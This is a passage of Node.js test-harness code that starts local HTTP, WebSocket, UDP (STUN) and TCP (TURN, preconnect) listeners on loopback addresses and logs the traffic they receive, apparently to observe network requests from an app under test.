      server.listen(port, host, () => resolve(server.address().port));
    });

  const app = http.createServer(appHandler("app"));
  const app6 = http.createServer((q, s) => app.emit("request", q, s));
  const site2 = http.createServer(appHandler("site2"));
  const site26 = http.createServer((q, s) => site2.emit("request", q, s));
  const xsite = http.createServer(appHandler("xsite"));
  const appPort = await listen(app, 0, "127.0.0.1");
  await listen(app6, appPort, "::1").catch(() => {});
  const site2Port = await listen(site2, 0, "127.0.0.1");
  await listen(site26, site2Port, "::1").catch(() => {});
  const xsitePort = await listen(xsite, 0, "127.0.0.1");
  const listenerPort = await listen(listener, 0, "::1");

  const udp = (name) =>
    new Promise((resolve) => {
      const s = dgram.createSocket("udp4");
      s.on("message", (m) =>
        log.udp.push({ at: Date.now(), label: state.label, socket: name, bytes: m.length }),
      );
      s.bind(0, "127.0.0.1", () => resolve(s));
    });
  const stun = await udp("stun");
  const stun2 = await udp("stun2");
  const tcp = (name) => {
    const s = net.createServer((c) => {
      log.tcp.push({ at: Date.now(), label: state.label, socket: name });
      c.on("error", () => {});
      setTimeout(() => c.destroy(), 200);
    });
    return listen(s, 0, "127.0.0.1").then((port) => ({ s, port }));
  };
  const turn = await tcp("turn");
  const preconnect = await tcp("preconnect");

  Object.assign(origins, {
    app: `http://localhost:${appPort}`,
    site2: `http://localhost:${site2Port}`,
    xsite: `http://127.0.0.1:${xsitePort}`,
    listener: `http://[::1]:${listenerPort}`,
    listenerWs: `ws://[::1]:${listenerPort}`,
    stun: stun.address().port,
    stun2: stun2.address().port,
    turn: turn.port,
    preconnect: `http://127.0.0.1:${preconnect.port}`,
  });

  const servers = [app, app6, site2, site26, xsite, listener, turn.s, preconnect.s];
  return {
    origins,
    log,
    state,
    close: async () => {
      stun.close();
      stun2.close();
      for (const s of servers) s.closeAllConnections?.();
      await Promise.all(servers.map((s) => new Promise((r) => s.close(() => r()))));
    },
  };
}
